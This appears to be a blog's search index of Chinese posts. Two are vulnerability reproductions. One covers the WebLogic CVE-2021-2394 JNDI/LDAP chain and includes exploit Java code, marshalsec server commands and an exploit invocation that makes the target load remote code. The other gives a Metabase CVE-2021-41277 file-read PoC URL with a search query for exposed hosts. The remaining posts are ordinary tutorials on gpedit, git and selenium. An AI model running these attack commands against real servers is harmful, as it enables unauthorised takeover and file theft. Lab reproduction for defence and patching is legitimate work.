<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CVE-2021-2394</title>
    <url>/CVE-2021-2394/</url>
    <content><![CDATA[<h1 id="CVE-2021-2394"><a href="#CVE-2021-2394" class="headerlink" title="CVE-2021-2394"></a>CVE-2021-2394</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a><strong>一、简介</strong></h2><p>​    oracle公司在2021年7月重要补丁更新报告中，通告中披露了WebLogic组件存在高危漏洞，攻击者可以在未授权的情况下通过IIOP、T3协议对存在漏洞的WebLogic Server组件进行攻击。成功利用该漏洞的攻击者可以接管WebLogic Server。</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
<h2 id="二、复现环境："><a href="#二、复现环境：" class="headerlink" title="二、复现环境："></a><strong>二、复现环境：</strong></h2><p><strong>平台：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	windows 10 </span><br><span class="line">​	kali2021</span><br></pre></td></tr></table></figure>



<p><strong>工具：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	jdk8  (注意，安装目录不可有空格） </span><br><span class="line">​	weblogic_12.2.1.3.0</span><br><span class="line">​	maven3.8.2 </span><br><span class="line">​	marshalsec </span><br><span class="line">​	exp </span><br><span class="line">​	python3</span><br></pre></td></tr></table></figure>



<h2 id="三、受影响版本"><a href="#三、受影响版本" class="headerlink" title="三、受影响版本"></a><strong>三、受影响版本</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">	Oracle WebLogic Server 10.3.6.0.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.1.3.0.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.2.1.3.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 12.2.1.4.0</span><br><span class="line"></span><br><span class="line">​	Oracle WebLogic Server 14.1.1.0.0</span><br></pre></td></tr></table></figure>


<h2 id="四、修复方式"><a href="#四、修复方式" class="headerlink" title="四、修复方式"></a><strong>四、修复方式</strong></h2><p>官方已发布补丁。</p>
<p>官方下载链接：<a href="https://www.oracle.com/security-alerts/cpuapr2021.html">https://www.oracle.com/security-alerts/cpuapr2021.html</a></p>
<h2 id="五、复现过程"><a href="#五、复现过程" class="headerlink" title="五、复现过程"></a><strong>五、复现过程</strong></h2><h3 id="1、安装"><a href="#1、安装" class="headerlink" title="1、安装"></a><strong>1、安装</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar fmw_12.2.1.3.0_wls.jar</span><br></pre></td></tr></table></figure>



<p>安装过程如环境搭建文档，下载weblogic 12.2.1.3.0并安装</p>
<p><img src= "/img/loading.gif" data-lazy-src="CVE-2021-2394/img/clipboard.png" alt="img"></p>
<h3 id="2、-攻击机-创建Exploit-java，通过javac编译得到Exploit-class"><a href="#2、-攻击机-创建Exploit-java，通过javac编译得到Exploit-class" class="headerlink" title="**2、[攻击机]**创建Exploit.java，通过javac编译得到Exploit.class"></a>**2、[攻击机]**创建Exploit.java，通过javac编译得到Exploit.class</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">javac Exploit.java   // 编译</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Exploit.class </span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;     </span><br><span class="line">    <span class="keyword">static</span> &#123;        </span><br><span class="line">        System.err.println(<span class="string">&quot;Pwned&quot;</span>);        </span><br><span class="line">        <span class="keyword">try</span> &#123;            </span><br><span class="line">            String cmds = <span class="string">&quot;calc&quot;</span>;            					         			 Runtime.getRuntime().exec(cmds);  <span class="comment">//执行命令        </span></span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;           </span><br><span class="line">            e.printStackTrace();        </span><br><span class="line">        &#125;    </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="3、-攻击机-jar目录下-使用python开启一个http服务，并使用marshalsec开启JNDI服务"><a href="#3、-攻击机-jar目录下-使用python开启一个http服务，并使用marshalsec开启JNDI服务" class="headerlink" title="**3、[攻击机]**jar目录下 使用python开启一个http服务，并使用marshalsec开启JNDI服务"></a>**3、[攻击机]**jar目录下 使用python开启一个http服务，并使用marshalsec开启JNDI服务</h3><p><strong>下载</strong>marshalsec工具</p>
<p><code>https://github.com/mbechler/marshalsec </code></p>
<p><strong>编译</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure>



<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
<h3 id="4、开启PYTHON服务【marshalsec-jar目录下】"><a href="#4、开启PYTHON服务【marshalsec-jar目录下】" class="headerlink" title="4、开启PYTHON服务【marshalsec.jar目录下】"></a><strong>4、开启PYTHON服务【marshalsec.jar目录下】</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m http.server 8000</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
<p><strong>开启JNDI服务【marshalsec.jar目录下】</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http:&#x2F;&#x2F;192.168.24.129:8000&#x2F;#Exploit&quot; 8087</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/1629912643.png" alt="1629912643"></p>
<h3 id="5、-攻击机-下载EXP"><a href="#5、-攻击机-下载EXP" class="headerlink" title="5、[攻击机]下载EXP"></a><strong>5、[攻击机]下载EXP</strong></h3><p><code>https://github.com/lz2y/CVE-2021-2394/releases/tag/2.0</code></p>
<p>运行【一条命令】</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -jar CVE_2021_2394.jar 192.168.24.132 7001 ldap:&#x2F;&#x2F;192.168.24.129:8087&#x2F;Exploit</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard.png" alt="clipboard"></p>
<p>攻击成功</p>
<h2 id="六、流量"><a href="#六、流量" class="headerlink" title="六、流量"></a><strong>六、流量</strong></h2><p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1630462621155.png" alt="clipboard-1630462621155"></p>
<p>第一条流量</p>
<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/clipboard-1630462633173.png" alt="clipboard-1630462633173"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>first</title>
    <url>/first/</url>
    <content><![CDATA[<p>hahahaha</p>
]]></content>
      <tags>
        <tag>test</tag>
      </tags>
  </entry>
  <entry>
    <title>Metabasegeojson任意文件读取漏洞CVE-2021-41277</title>
    <url>/CVE-2021-41277-Metabasegeojson%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Metabasegeojson任意文件读取漏洞CVE-2021-41277"><a href="#Metabasegeojson任意文件读取漏洞CVE-2021-41277" class="headerlink" title="Metabasegeojson任意文件读取漏洞CVE-2021-41277"></a>Metabasegeojson任意文件读取漏洞CVE-2021-41277</h1><h2 id="一-、漏洞描述"><a href="#一-、漏洞描述" class="headerlink" title="一|、漏洞描述"></a>一|、漏洞描述</h2><p>​    在受影响的版本中，自定义 GeoJSON 地图（admin-&gt;settings-&gt;maps-&gt;custom maps-&gt;add a map）操作缺少权限验证，攻击者可通过该漏洞获得敏感信息</p>
<h2 id="二-漏洞影响"><a href="#二-漏洞影响" class="headerlink" title="二: 漏洞影响"></a>二: 漏洞影响</h2><ul>
<li><strong>metabase version &lt; 0.40.5</strong></li>
<li><strong>metabase version &gt;= 1.0.0, &lt; 1.40.5</strong></li>
</ul>
<h3 id="1、fofa-so搜索"><a href="#1、fofa-so搜索" class="headerlink" title="1、fofa.so搜索"></a>1、fofa.so搜索</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;Metabase geojson&quot;</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220219004406584.png" alt="image-20220219004406584"></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;IP&#x2F;api&#x2F;geojson?url&#x3D;file:xxxxx</span><br></pre></td></tr></table></figure>



<p><img src= "/img/loading.gif" data-lazy-src="../img/document/1/image-20220219004247065.png" alt="image-20220219004247065"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
        <category>Metabasegeojson</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>win10家庭版没有组策略解决方式</title>
    <url>/win10%E5%AE%B6%E5%BA%AD%E7%89%88%E6%B2%A1%E6%9C%89%E7%BB%84%E7%AD%96%E7%95%A5%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
    <content><![CDATA[<div class="note primary simple"><h5 id="1-新建一个文件"><a href="#1-新建一个文件" class="headerlink" title="1.新建一个文件"></a>1.新建一个文件</h5></div>

<p><img src= "/img/loading.gif" data-lazy-src="../img%5Cdocument%5Cgpedit%5C118081416313.png" alt="118081416313"></p>
<div class="note primary simple"><h5 id="2-将代码放入"><a href="#2-将代码放入" class="headerlink" title="2.将代码放入"></a>2.将代码放入</h5></div>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line"></span><br><span class="line">pushd &quot;%~dp0&quot;</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;List.txt</span><br><span class="line"></span><br><span class="line">dir &#x2F;b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;List.txt</span><br><span class="line"></span><br><span class="line">for &#x2F;f %%i in (&#39;findstr &#x2F;i . List.txt 2^&gt;nul&#39;) do dism &#x2F;online &#x2F;norestart &#x2F;add-package:&quot;C:\Windows\servicing\Packages\%%i&quot;</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<p>CTRL+C保存</p>
<div class="note primary simple"><h5 id="3-将文件扩展名改为-bat"><a href="#3-将文件扩展名改为-bat" class="headerlink" title="3.将文件扩展名改为.bat"></a>3.将文件扩展名改为.bat</h5></div>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082125198.png" alt="img"></p>
<div class="note primary simple"><h5 id="4-右键以管理员身份运行"><a href="#4-右键以管理员身份运行" class="headerlink" title="4.右键以管理员身份运行"></a>4.右键以管理员身份运行</h5></div>

<p><img src= "/img/loading.gif" data-lazy-src="../img/document/gpedit/118082509921.png" alt="img"></p>
<h5 id="5-将生成的临时文件list-txt删除"><a href="#5-将生成的临时文件list-txt删除" class="headerlink" title="5.将生成的临时文件list.txt删除"></a>5.将生成的临时文件list.txt删除</h5>]]></content>
      <tags>
        <tag>window</tag>
      </tags>
  </entry>
  <entry>
    <title>git将本地代码上传到远程仓库</title>
    <url>/git%E5%B0%86%E6%9C%AC%E5%9C%B0%E4%BB%A3%E7%A0%81%E4%B8%8A%E4%BC%A0%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[<p><strong>1.注册账户</strong><br><a href="https://github.com/">https://github.com/</a><br><strong>2.新建库</strong><br><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091458521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20201105091851782.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDAzNTM0MA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>3.git下载</strong><br><a href="https://git-scm.com/downloads">https://git-scm.com/downloads</a><br><strong>4.安装</strong><br>       按提示安装</p>
<p><strong>5.查看ssh是否生成，如果没有</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;xxx@qq.com&quot;</span>  <span class="comment">#注册github时的邮箱</span></span><br></pre></td></tr></table></figure>

<p>如果显示没有这个命令，需要配置环境变量</p>
<pre><code>   添加git/bin的位置
</code></pre>
<p><strong>6.ssh生成后，在id_rsa.pub中，复制里面的 key。</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<pre><code> 测试是否连接成功，
 出现hi 用户名  表示已成功
</code></pre>
<p><strong>7.设置用户名</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">&quot;name&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>8.设置邮箱</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">git config --<span class="keyword">global</span> user.email <span class="string">&quot;2xxxxxxxxxxx@qq.com&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>9.上传</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">  <span class="comment">#把这个目录变成Git可以管理的仓库</span></span><br><span class="line">git init     </span><br><span class="line">  <span class="comment">#将全部文件添加到仓库</span></span><br><span class="line">git add .   </span><br><span class="line">  <span class="comment">#把文件提交到仓库  &quot;message_board&quot;文件名</span></span><br><span class="line">git commit -m “message_board”</span><br><span class="line">  <span class="comment">#关联远程仓库</span></span><br><span class="line">git remote add origin git@github.com:username/message_board.git</span><br><span class="line">  <span class="comment">#把本地库的所有内容推送到远程库上</span></span><br><span class="line">git push -u origin master </span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>selenium模块</title>
    <url>/selenium%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a><strong>一、简介</strong></h1><p>自动化测模块，通过驱动浏览器，模拟浏览器的操作，比如跳转、输入、点击、下拉等，来拿到网页渲染之后的结果，可支持多种浏览器。</p>
<h1 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a><strong>二、安装</strong></h1><h2 id="3-1、pip-安装"><a href="#3-1、pip-安装" class="headerlink" title="3.1、pip 安装"></a><strong>3.1、pip 安装</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install selenium</span><br></pre></td></tr></table></figure>

<h2 id="3-2、安装驱动"><a href="#3-2、安装驱动" class="headerlink" title="3.2、安装驱动"></a><strong>3.2、安装驱动</strong></h2><p>注：安装完记得配置环境变量~ [path]</p>
<ul>
<li><strong>Firefox浏览器驱动：geckodriver</strong>  </li>
</ul>
<p>​    <a href="https://github.com/mozilla/geckodriver/releases">https://github.com/mozilla/geckodriver/releases</a></p>
<ul>
<li><strong>Chrome浏览器驱动：</strong></li>
</ul>
<p>​    <a href="http://chromedriver.storage.googleapis.com/index.html">http://chromedriver.storage.googleapis.com/index.html</a></p>
<ul>
<li><strong>IE浏览器驱动：IEDriverServer</strong></li>
</ul>
<p>​    <a href="http://selenium-release.storage.googleapis.com/index.html">http://selenium-release.storage.googleapis.com/index.html</a></p>
<ul>
<li><strong>Edge浏览器驱动：MicrosoftWebDriver</strong></li>
</ul>
<p>​    <a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/">https://developer.microsoft.com/en-us/microsoft-edge/tools/webdriver/</a></p>
<ul>
<li><strong>Opera浏览器驱动：operadriver</strong></li>
</ul>
<p><a href="https://github.com/operasoftware/operachromiumdriver/releases">https://github.com/operasoftware/operachromiumdriver/releases</a></p>
<ul>
<li><strong>PhantomJS浏览器驱动：phantomjs</strong></li>
</ul>
<p><a href="https://phantomjs.org/download.html">https://phantomjs.org/download.html</a></p>
<h1 id="三、基本使用"><a href="#三、基本使用" class="headerlink" title="三、基本使用"></a><strong>三、</strong>基本使用</h1><h2 id="3-1、Options-）"><a href="#3-1、Options-）" class="headerlink" title="3.1、Options(）"></a><strong>3.1、Options(）</strong></h2><p>Chrome Options是一个配置chrome启动时属性的类，通过这个参数我们可以为Chrome添加如下参数：</p>
<p><strong>1、基本参数</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver option &#x3D; webdriver.ChromeOptions()</span><br><span class="line"># 禁用显卡 </span><br><span class="line">option.add_argument(&#39;--disable-gpu&#39;) </span><br><span class="line"># 替换UA</span><br><span class="line">option.add_argument(&quot;--user-agent&#x3D;Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;67.0.3396.99 Safari&#x2F;537.36&quot;)  </span><br><span class="line">#指定浏览器分辨率 </span><br><span class="line">option.add_argument(&#39;window-size&#x3D;1920x3000&#39;) </span><br><span class="line">#谷歌文档提到需要加上这个属性来规避bug </span><br><span class="line">option.add_argument(&#39;--disable-gpu&#39;) </span><br><span class="line">#隐藏滚动条, 应对一些特殊页面 </span><br><span class="line">option.add_argument(&#39;--hide-scrollbars&#39;) </span><br><span class="line">#不加载图片, 提升速度</span><br><span class="line">option.add_argument(&#39;blink-settings&#x3D;imagesEnabled&#x3D;false&#39;) </span><br><span class="line">#设置语言</span><br><span class="line">options.add_argument(&#39;lang&#x3D;zh_CN.UTF-8&#39;)  </span><br><span class="line"># 禁止策略化</span><br><span class="line">options.add_argument(&#39;--disable-infobars&#39;)  </span><br><span class="line"># 解决DevToolsActivePort文件不存在的报错</span><br><span class="line">options.add_argument(&#39;--no-sandbox&#39;)</span><br><span class="line"># 指定浏览器分辨率 </span><br><span class="line">options.add_argument(&#39;window-size&#x3D;1920x3000&#39;)  </span><br><span class="line"># 隐身模式（无痕模式）</span><br><span class="line">bug options.add_argument(&#39;--incognito&#39;)   </span><br><span class="line"># 禁用javascript</span><br><span class="line">options.add_argument(&#39;--disable-javascript&#39;)   </span><br><span class="line"># 最大化运行（全屏窗口）,不设置，取元素会报错</span><br><span class="line">options.add_argument(&#39;--start-maximized&#39;)   </span><br><span class="line"># 禁用浏览器正在被自动化程序控制的提示</span><br><span class="line">options.add_argument(&#39;--disable-infobars&#39;)   </span><br><span class="line"># 隐藏滚动条, 应对一些特殊页面 </span><br><span class="line">options.add_argument(&#39;--hide-scrollbars&#39;)  </span><br><span class="line"># 开启无界面模式. linux下如果系统不支持可视化不加这条会启动失败 </span><br><span class="line">options.add_argument(&#39;--headless&#39;)  </span><br><span class="line">#开发者模式</span><br><span class="line">options.add_experimental_option(&#39;excludeSwitches&#39;, [&#39;enable-automation&#39;])   </span><br><span class="line"># 屏蔽&#39;保存密码&#39;提示框 </span><br><span class="line">options.add_experimental_option(&quot;prefs&quot;, prefs) </span><br><span class="line"># 手动指定使用的浏览器位置</span><br><span class="line">options.binary_location &#x3D; r&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot;  </span><br><span class="line">driver &#x3D; webdriver.Chrome(chrome_options &#x3D; options) driver.get(&#39;https:&#x2F;&#x2F;www.baidu.com&#39;)</span><br></pre></td></tr></table></figure>



<p><strong>2、设置代理</strong></p>
<p>方法1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip_info&#x3D;&quot;182.14.2.3:29&quot; options.add_argument(&quot;--proxy-server&#x3D;http:&#x2F;&#x2F;&#123;&#125;&quot;.format(ip_info))   #设置代理</span><br></pre></td></tr></table></figure>



<p>方法2：</p>
<p>更新代理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proxy &#x3D; Proxy(</span><br><span class="line">    &#123;</span><br><span class="line">        &#39;proxyType&#39;: ProxyType.MANUAL,</span><br><span class="line">        &#39;httpProxy&#39;: &#39;&#123;&#125;&#39;.format(ip_info)  # 代理ip和端口</span><br><span class="line">        #&#39;httpProxy&#39;: &#39;&#123;&#125;&#39;.format(&quot;11.2.2.22:8080&quot;)  # 代理ip和端口</span><br><span class="line">    &#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">desired_capabilities &#x3D; webdriver.DesiredCapabilities.CHROME.copy()</span><br><span class="line">proxy.add_to_capabilities(desired_capabilities)</span><br><span class="line">driver.start_session(desired_capabilities)</span><br></pre></td></tr></table></figure>



<p><strong>3、关闭selenium关闭左上方Chrome 正受到自动测试软件的控制的提示</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">options.add_experimental_option(&#39;useAutomationExtension&#39;, False) options.add_experimental_option(&quot;excludeSwitches&quot;, [&#39;enable-automation&#39;])</span><br></pre></td></tr></table></figure>



<h2 id="3-2、打开一个测试窗口"><a href="#3-2、打开一个测试窗口" class="headerlink" title="3.2、打开一个测试窗口"></a><strong>3.2、打开一个测试窗口</strong></h2><p><strong>1.通过谷歌浏览器驱动，打开谷歌浏览器</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 打开浏览器方式一</span><br><span class="line">driver &#x3D; webdriver.Chrome(executable_path&#x3D;r&#39;C:\Users\Administrator\Desktop\chromedriver.exe&#39;)</span><br><span class="line"></span><br><span class="line"># 打开浏览器方式二  推荐  []需要配置环境变量]</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line"></span><br><span class="line">browser.get(&#39;https:&#x2F;&#x2F;www.baidu.com&#39;)</span><br><span class="line">input &#x3D; browser.find_element_by_id(&#39;kw&#39;)#找到搜索框 ，根据id找</span><br><span class="line">input.send_keys(&#39;iPhone&#39;)#传送入关键词</span><br><span class="line"># time.sleep(5)  </span><br><span class="line"># input.clear()#清空搜索框</span><br><span class="line"># input.send_keys(&#39;1111&#39;)  #输入1111</span><br><span class="line">button &#x3D; browser.find_element_by_id(&#39;su&#39;)#找到搜索按钮</span><br><span class="line">button.click()  #点击</span><br></pre></td></tr></table></figure>



<h2 id="3-3、关闭测试窗口"><a href="#3-3、关闭测试窗口" class="headerlink" title="3.3、关闭测试窗口"></a><strong>3.3、关闭测试窗口</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">driver.close() #关闭单个窗口   #linux可能出现问题 </span><br><span class="line">driver.quit() #关闭所有窗口</span><br></pre></td></tr></table></figure>



<h2 id="3-4、获取部分信息"><a href="#3-4、获取部分信息" class="headerlink" title="3.4、获取部分信息"></a><strong>3.4、获取部分信息</strong></h2><p><strong>1、获取url</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">h&#x3D;driver.get(url)</span><br></pre></td></tr></table></figure>

<p><strong>2、获取cookie</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cookie&#x3D;dervr.get_cookie()</span><br></pre></td></tr></table></figure>

<p><strong>3、获取值</strong></p>
<ul>
<li>get_attribute()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#x3D; browser.find_element_by_id(&#39;kw&#39;).get_attribute(&#39;href&#39;)</span><br></pre></td></tr></table></figure>



<ul>
<li>text</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#x3D; browser.find_element_by_id(&#39;kw&#39;).text</span><br></pre></td></tr></table></figure>



<p><strong>4、tag_name来获取元素的标签信息</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">b&#x3D; browser.find_element_by_id(&#39;kw&#39;).tag_name</span><br></pre></td></tr></table></figure>



<h2 id="3-5、等待"><a href="#3-5、等待" class="headerlink" title="3.5、等待"></a><strong>3.5、等待</strong></h2><p>由于可能出现页面未加载，就执行其他代码的情况，因此，需要添加等待</p>
<p><strong>1、强制等待</strong></p>
<p>time.sleep()</p>
<p><strong>2、隐式等待</strong></p>
<p>隐式等待:在查找所有元素时，如果尚未被加载，则等10秒</p>
<p>隐式等待只需要设置一次，在设置时间内，页面加载就停止等待</p>
<p>超过时间，会报错</p>
<p>browser.implicitly_wait(10)</p>
<p><strong>3、显式等待</strong></p>
<p>等待一个元素加载处理</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from selenium.webdriver.support import expected_conditions as EC</span><br><span class="line">from selenium.webdriver.common.by import By</span><br><span class="line">from selenium.webdriver.support.wait import WebDriverWait</span><br><span class="line">driver &#x3D; webdriver.Chrome()</span><br><span class="line">driver.get(&quot;https:&#x2F;&#x2F;www.baidu.com&quot;)</span><br><span class="line">WebDriverWait(driver, 5).until(EC.presence_of_all_elements_located((By.ID, &quot;kw&quot;)),message&#x3D;&#39;元素kw未出现&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<ul>
<li>.判断当前页面的title是否精确等于预期</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.title_is(u&quot;百度一下，你就知道&quot;))</span><br></pre></td></tr></table></figure>



<ul>
<li>.判断当前页面的title是否包含预期字符串</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.title_contains(u&quot;百度一下&quot;))</span><br></pre></td></tr></table></figure>



<ul>
<li>判断某个元素是否被加到了dom树里，并不代表该元素一定可见，通俗易懂点就是元素存不存在这个页面</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.presence_of_element_located((By.ID,&#39;kw&#39;)))</span><br></pre></td></tr></table></figure>



<ul>
<li>判断是否至少有1个元素存在于dom树中，如果页面上有n个元素的class都是’column-md-3’，那么只要有1个元素存在，这个方法就返回True</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver, 5).until(EC.presence_of_all_elements_located((By.ID, &quot;kw&quot;)))</span><br></pre></td></tr></table></figure>



<ul>
<li>判断某个元素是否可见.可见代表元素非隐藏，并且元素的宽和高都不等于0</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p>WebDriverWait(driver, 5).until(EC.visibility_of_element_located((By.ID, ‘k’)))</p>
<ul>
<li>判断元素是否可见，如果可见就返回这个元素</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.visibility_of(driver.find_element(by&#x3D;By.ID,value&#x3D;&#39;kw&#39;)))</span><br></pre></td></tr></table></figure>



<ul>
<li>判断某个元素是否被选中了,一般用在下拉列表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.element_to_be_selected(driver.find_element(By.XPATH,&quot;&#x2F;&#x2F;*[@id&#x3D;&#39;nr&#39;]&#x2F;option[1]&quot;)))</span><br></pre></td></tr></table></figure>



<ul>
<li>判断页面上是否存在alert,如果有就切换到alert并返回alert的内容</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">instance &#x3D; WebDriverWait(driver,10).until(EC.alert_is_present())</span><br></pre></td></tr></table></figure>



<ul>
<li>判断该frame是否可以switch进去，如果可以的话，返回True并且switch进去，否则返回False</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WebDriverWait(driver,10).until(EC.frame_to_be_available_and_switch_to_it(locator))</span><br></pre></td></tr></table></figure>



<h1 id="四、选择器"><a href="#四、选择器" class="headerlink" title="四、选择器"></a><strong>四、选择器</strong></h1><h2 id="4-1、定位元素常用八种方法"><a href="#4-1、定位元素常用八种方法" class="headerlink" title="4.1、定位元素常用八种方法"></a><strong>4.1、定位元素常用八种方法</strong></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">driver.find_element_by_id()  #通过元素id定位</span><br><span class="line">driver.find_element_by_name()  #通过元素name定位</span><br><span class="line">driver.find_element_by_xpath()  #通过xpath表达式定位</span><br><span class="line">driver.find_element_by_link_text()  #通过完整超链接定位</span><br><span class="line">driver.find_element_by_partial_link_text()  #通过部分链接定位</span><br><span class="line">driver.find_element_by_tag_name()  #通过标签定位</span><br><span class="line">driver.find_element_by_class_name()  #通过类名进行定位</span><br><span class="line">driver.find_element_by_css_selector()  #通过css选择器进行定位</span><br></pre></td></tr></table></figure>

